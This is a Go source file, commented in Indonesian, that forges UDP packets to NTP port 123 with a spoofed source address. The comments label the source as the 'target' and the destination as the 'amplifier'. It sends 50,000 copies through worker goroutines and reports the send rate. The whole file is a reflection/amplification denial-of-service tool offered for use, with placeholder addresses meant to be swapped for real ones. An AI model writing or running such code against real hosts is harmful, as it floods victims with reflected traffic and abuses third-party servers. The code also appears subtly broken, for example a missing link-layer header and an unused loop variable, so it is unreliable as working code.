package main

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	iface      = "eth0"          // Ubah ke interface kamu
	srcIP      = "127.0.0.1"     // Spoofed (target kamu)
	dstIP      = "127.0.0.1"     // Amplifier
	numWorkers = 10              // Goroutine
	totalPackets = 50000
)

var packetData []byte

func buildPacket() []byte {
	src := net.ParseIP(srcIP)
	dst := net.ParseIP(dstIP)

	ip := &layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    src,
		DstIP:    dst,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 123,
		DstPort: 123,
	}
	udp.SetNetworkLayerForChecksum(ip)

	payload := []byte{0x1b}
	payload = append(payload, make([]byte, 47)...)

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buf, opts, ip, udp, gopacket.Payload(payload))

	return buf.Bytes()
}

func worker(id int, handle *pcap.Handle, jobs <-chan int, results chan<- bool) {
	for j := range jobs {
		err := handle.WritePacketData(packetData)
		if err != nil {
			log.Printf("[Worker %d] Error: %v\n", id, err)
			results <- false
			continue
		}
		results <- true
	}
}

func main() {
	fmt.Println("🚀 Kirim spoofed UDP packet...")

	handle, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	packetData = buildPacket()

	jobs := make(chan int, totalPackets)
	results := make(chan bool, totalPackets)

	for w := 1; w <= numWorkers; w++ {
		go worker(w, handle, jobs, results)
	}

	start := time.Now()
	for j := 0; j < totalPackets; j++ {
		jobs <- j
	}
	close(jobs)

	success := 0
	for a := 0; a < totalPackets; a++ {
		if <-results {
			success++
		}
	}

	duration := time.Since(start)
	fmt.Printf("✅ Sukses kirim %d packet dalam %v\n", success, duration)
	fmt.Printf("⚡ PPS: %.2f\n", float64(success)/duration.Seconds())
}
